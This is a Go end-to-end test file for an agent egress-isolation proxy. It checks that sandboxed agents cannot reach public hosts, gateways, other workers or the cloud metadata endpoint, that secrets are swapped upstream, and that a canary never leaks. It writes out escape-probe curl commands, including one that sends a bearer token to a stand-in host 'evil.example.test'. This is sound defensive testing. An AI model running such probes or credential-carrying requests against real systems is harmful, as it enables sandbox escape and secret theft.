//go:build e2e

package e2e

import (
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/ethosagent/warden/internal/analytics"
	"github.com/ethosagent/warden/internal/denyreason"
)

// probe is one curl run from an agent with a machine-readable footer.
type probe struct {
	exit     int
	httpCode string // %{http_code}
	connect  string // %{http_connect}: the proxy's CONNECT status
	remoteIP string // empty when no TCP connection was ever established
	errMsg   string // curl's own error text
	url      string // %{url_effective}: the URL curl was actually given
	raw      cmdResult
}

var probeFooter = regexp.MustCompile(`(?m)^(http_code|http_connect|remote_ip|errormsg|url_effective)=(.*)$`)

// curlProbe runs `curl` in agent with extra flags and url, no proxy
// involvement unless the caller adds -x, and parses the footer.
func curlProbe(t *testing.T, agent string, args ...string) probe {
	t.Helper()
	full := append([]string{"curl", "-s", "-o", "/dev/null", "--max-time", "5", "-w",
		"http_code=%{http_code}\nhttp_connect=%{http_connect}\nremote_ip=%{remote_ip}\nerrormsg=%{errormsg}\nurl_effective=%{url_effective}\n"}, args...)
	res := agentRun(t, agent, full...)
	p := probe{exit: res.exit, raw: res}
	for _, m := range probeFooter.FindAllStringSubmatch(res.stdout, -1) {
		switch m[1] {
		case "http_code":
			p.httpCode = m[2]
		case "http_connect":
			p.connect = m[2]
		case "remote_ip":
			p.remoteIP = m[2]
		case "errormsg":
			p.errMsg = m[2]
		case "url_effective":
			p.url = m[2]
		}
	}
	if p.httpCode == "" {
		t.Fatalf("e2e: curl produced no footer (exit %d): stdout %q stderr %q", res.exit, res.stdout, res.stderr)
	}
	return p
}

// Curl exit codes a blocked path may produce. Anything else (2 init failure,
// 3 bad URL, 4 feature missing, 6 resolve failure on an IP literal, 60 TLS...)
// means the row is broken or reached something, and fails the test.
const (
	curlCouldntConnect = 7  // no route / refused
	curlTimeout        = 28 // operation timed out
	curlCouldntResolve = 6
)

// assertBlocked fails unless the probe never established a TCP connection and
// died for a network reason in okExits. wantErr (if set) must appear in
// curl's error text or effective URL, which proves curl tried the intended
// address (a name that times out resolving never appears in the error text).
func assertBlocked(t *testing.T, p probe, wantErr string, okExits ...int) {
	t.Helper()
	if p.exit == 0 {
		t.Fatalf("ESCAPE: connection succeeded (http %s, remote %s)", p.httpCode, p.remoteIP)
	}
	if p.remoteIP != "" {
		t.Fatalf("ESCAPE: TCP connection established to %s (curl exit %d, %s)", p.remoteIP, p.exit, p.errMsg)
	}
	ok := false
	for _, e := range okExits {
		ok = ok || p.exit == e
	}
	if !ok {
		t.Fatalf("curl exit %d is not a network block (want one of %v): %s", p.exit, okExits, p.errMsg)
	}
	if wantErr != "" && !strings.Contains(p.errMsg, wantErr) && !strings.Contains(p.url, wantErr) {
		t.Fatalf("curl error %q (url %q) does not mention the intended target %q: the row may be mistyped", p.errMsg, p.url, wantErr)
	}
}

// TestIsolation_AgentHasNoRouteOut: every way off the agent's network fails,
// and each negative row is read next to a positive control that proves the
// probe shape itself works.
func TestIsolation_AgentHasNoRouteOut(t *testing.T) {
	w1IP := containerIP(t, svcWorker1, netW1)
	w2IP := containerIP(t, svcWorker2, netW2)
	cpIP := containerIP(t, svcCP, netCP)
	gw := networkGateway(t, netW1)
	noProxy := []string{"--noproxy", "*"}

	t.Run("control/direct-neighbor-reachable", func(t *testing.T) {
		// Same flags as every negative row below, aimed at the one neighbor the
		// agent may reach: worker-1's admin port, by name and by IP.
		for _, target := range []string{"http://worker-1:9090/healthz", "http://" + w1IP + ":9090/healthz"} {
			p := curlProbe(t, svcAgent1, append(noProxy, target)...)
			if p.exit != 0 || p.httpCode != "200" || p.remoteIP != w1IP {
				t.Fatalf("control %s: exit %d http %s remote %q (%s); the probe shape is broken", target, p.exit, p.httpCode, p.remoteIP, p.errMsg)
			}
		}
	})

	t.Run("control/embedded-dns-resolves-neighbor", func(t *testing.T) {
		res := agentRun(t, svcAgent1, "nslookup", "-type=a", "worker-1.", "127.0.0.11")
		if res.exit != 0 || !strings.Contains(res.stdout, w1IP) {
			t.Fatalf("control: nslookup worker-1. via 127.0.0.11: exit %d, want address %s\n%s%s", res.exit, w1IP, res.stdout, res.stderr)
		}
	})

	curlRows := []struct {
		name, wantErr string
		exits         []int
		args          []string
	}{
		{"public-ip-no-proxy", "1.1.1.1:443", []int{curlCouldntConnect, curlTimeout}, append([]string{"https://1.1.1.1"}, noProxy...)},
		// busybox nslookup has no TCP mode (-vc prints usage), so DNS-over-TCP
		// is probed as a raw TCP connect to the resolver port instead.
		{"public-dns-over-tcp", "1.1.1.1:53", []int{curlCouldntConnect, curlTimeout}, append([]string{"http://1.1.1.1:53/"}, noProxy...)},
		{"ipv6", "2606:4700:4700::1111", []int{curlCouldntConnect, curlTimeout}, append([]string{"-6", "https://[2606:4700:4700::1111]"}, noProxy...)},
		{"control-plane-by-ip", cpIP + ":7070", []int{curlCouldntConnect, curlTimeout}, append([]string{"-k", "https://" + cpIP + ":7070/healthz"}, noProxy...)},
		{"control-plane-by-name", "control-plane", []int{curlCouldntResolve, curlCouldntConnect, curlTimeout}, append([]string{"-k", "https://control-plane:7070/healthz"}, noProxy...)},
		{"docker-network-gateway", gw + ":80", []int{curlCouldntConnect, curlTimeout}, append([]string{"http://" + gw}, noProxy...)},
		{"docker-default-bridge-gateway", "172.17.0.1:80", []int{curlCouldntConnect, curlTimeout}, append([]string{"http://172.17.0.1"}, noProxy...)},
		{"cloud-metadata", "169.254.169.254:80", []int{curlCouldntConnect, curlTimeout}, append([]string{"http://169.254.169.254/"}, noProxy...)},
		{"other-worker-by-ip", w2IP + ":9090", []int{curlCouldntConnect, curlTimeout}, append([]string{"http://" + w2IP + ":9090/healthz"}, noProxy...)},
		{"other-worker-by-name", "worker-2", []int{curlCouldntResolve, curlCouldntConnect, curlTimeout}, append([]string{"http://worker-2:9090/healthz"}, noProxy...)},
	}
	for _, row := range curlRows {
		t.Run(row.name, func(t *testing.T) {
			assertBlocked(t, curlProbe(t, svcAgent1, row.args...), row.wantErr, row.exits...)
		})
	}

	t.Run("public-dns-over-udp", func(t *testing.T) {
		res := agentRun(t, svcAgent1, "nslookup", "example.com", "1.1.1.1")
		out := res.stdout + res.stderr
		if res.exit == 0 {
			t.Fatalf("ESCAPE: public DNS answered:\n%s", out)
		}
		// "Network unreachable" (no route) or a timeout: a real network
		// failure. A usage message or a missing tool is not a block.
		if !strings.Contains(out, "unreachable") && !strings.Contains(out, "timed out") {
			t.Fatalf("nslookup failed for an unexpected reason (exit %d): %s", res.exit, out)
		}
	})

	t.Run("public-name-via-embedded-resolver", func(t *testing.T) {
		res := agentRun(t, svcAgent1, "nslookup", "example.com.", "127.0.0.11")
		out := res.stdout + res.stderr
		if res.exit == 0 {
			t.Fatalf("ESCAPE: embedded resolver forwarded a public name:\n%s", out)
		}
		if !strings.Contains(out, "can't find") && !strings.Contains(out, "timed out") {
			t.Fatalf("nslookup failed for an unexpected reason (exit %d): %s", res.exit, out)
		}
	})

	t.Run("allowed-host-wrong-port", func(t *testing.T) {
		since := time.Now()
		proxy := []string{"-x", "http://worker-1:8080"}
		// Control: the allowed host on its allowed port tunnels (CONNECT 200).
		ok := curlProbe(t, svcAgent1, append(proxy, "https://api.example.test/")...)
		if ok.connect != "200" || ok.exit != 0 {
			t.Fatalf("control: allowed host through worker-1: CONNECT %s exit %d (%s)", ok.connect, ok.exit, ok.errMsg)
		}
		p := curlProbe(t, svcAgent1, append(proxy, "https://api.example.test:8443/")...)
		if p.connect != "403" || p.exit == 0 {
			t.Fatalf("wrong port: CONNECT %s exit %d (%s); want 403 and a failed request", p.connect, p.exit, p.errMsg)
		}
		evs := events(t, svcWorker1, since, 1, func(e analytics.Event) bool {
			return e.Domain == "api.example.test" && e.Port == 8443 && e.Decision == "deny"
		})
		for _, e := range evs {
			if e.Domain == "api.example.test" && e.Port == 8443 && e.Reason != string(denyreason.PolicyNoMatch) {
				t.Errorf("wrong-port deny reason %q, want %q", e.Reason, denyreason.PolicyNoMatch)
			}
		}
	})
}

// TestIsolation_AllowedCallSwapsSecret: an allowed call arrives upstream with
// the real secret while the agent only ever held, and sees, the placeholder.
func TestIsolation_AllowedCallSwapsSecret(t *testing.T) {
	resetRecorded(t)
	since := time.Now()
	res := agentRun(t, svcAgent1, "curl", "-sS", "-i", "--max-time", "10",
		"-H", "Authorization: Bearer "+placeholder, "-w", "\nstatus=%{http_code}\n", "https://api.example.test/")
	if res.exit != 0 || !strings.Contains(res.stdout, "status=200") {
		t.Fatalf("allowed call: exit %d\nstdout: %s\nstderr: %s", res.exit, res.stdout, res.stderr)
	}

	var seen *Request
	for _, r := range recorded(t) {
		r := r
		if r.Host == "api.example.test" && len(r.Header["Authorization"]) > 0 {
			seen = &r
		}
	}
	if seen == nil {
		t.Fatal("upstream recorded no authorized request to api.example.test")
	}
	if got, want := seen.Header.Get("Authorization"), "Bearer "+canary; got != want {
		t.Fatalf("upstream Authorization = %q, want the swapped canary (%q): the swap stage did not run", got, want)
	}
	if hits := leaksIn(res.stdout+res.stderr, canaryNeedles(canary)); len(hits) > 0 {
		t.Fatalf("canary reached the agent (%v)", hits)
	}

	evs := events(t, svcWorker1, since, 1, func(e analytics.Event) bool {
		return e.Domain == "api.example.test" && e.Decision == "allow"
	})
	for _, e := range evs {
		if e.Decision == "allow" && e.SecretRef == "" {
			t.Errorf("allow event carries no SecretRef although a secret was swapped: %+v", e)
		}
		if hits := leaksIn(e.SecretRef, canaryNeedles(canary)); len(hits) > 0 {
			t.Errorf("event SecretRef holds the raw canary (%v)", hits)
		}
	}
}

// TestIsolation_DefaultDeny: an unlisted/denied host is refused at CONNECT,
// never reaches the upstream, and leaves exactly one deny event.
func TestIsolation_DefaultDeny(t *testing.T) {
	resetRecorded(t)
	since := time.Now()
	p := curlProbe(t, svcAgent1, "-x", "http://worker-1:8080", "https://evil.example.test/")
	if p.connect != "403" || p.exit == 0 {
		t.Fatalf("evil.example.test: CONNECT %s exit %d (%s); want 403 and a failed request", p.connect, p.exit, p.errMsg)
	}
	evs := events(t, svcWorker1, since, 1, func(e analytics.Event) bool {
		return e.Domain == "evil.example.test" && e.Decision == "deny"
	})
	n := 0
	for _, e := range evs {
		if e.Domain == "evil.example.test" {
			n++
			if e.Decision != "deny" {
				t.Errorf("evil.example.test event decision %q, want deny", e.Decision)
			}
			if e.Reason != string(denyreason.PolicyDenylist) {
				t.Errorf("evil.example.test deny reason %q, want %q", e.Reason, denyreason.PolicyDenylist)
			}
		}
	}
	if n != 1 {
		t.Errorf("deny events for evil.example.test = %d, want exactly 1 (%s)", n, summarize(evs))
	}
	for _, r := range recorded(t) {
		if strings.Contains(r.Host, "evil.example.test") {
			t.Errorf("denied host reached the upstream: %+v", r)
		}
	}
}

// TestIsolation_CanaryNeverLeaked runs a swap and a deny, then hunts the
// canary in every place it must not be.
func TestIsolation_CanaryNeverLeaked(t *testing.T) {
	resetRecorded(t)
	var outs []string
	for _, args := range [][]string{
		{"curl", "-sS", "-i", "--max-time", "10", "-H", "Authorization: Bearer " + placeholder, "https://api.example.test/"},
		{"curl", "-sS", "-i", "--max-time", "10", "-H", "Authorization: Bearer " + placeholder, "https://api.example.test/echo?x=" + placeholder},
		{"curl", "-sS", "-i", "--max-time", "10", "-H", "Authorization: Bearer " + placeholder, "https://evil.example.test/"},
	} {
		res := agentRun(t, svcAgent1, args...)
		outs = append(outs, res.stdout, res.stderr)
	}
	// The recorder must hold the canary: it proves the swap ran and gives the
	// scanner (below) something it demonstrably can see.
	if !strings.Contains(string(recordedRaw(t)), canary) {
		t.Fatal("upstream never received the canary: the swap stage did not run")
	}
	// Barrier: the fleet view must hold the events of the calls above before
	// the leak scan reads it (events are written asynchronously).
	events(t, svcWorker1, time.Now().Add(-time.Minute), 1, func(e analytics.Event) bool {
		return e.Domain == "evil.example.test" && e.Decision == "deny"
	})
	AssertCanaryNeverLeaked(t, outs...)
}
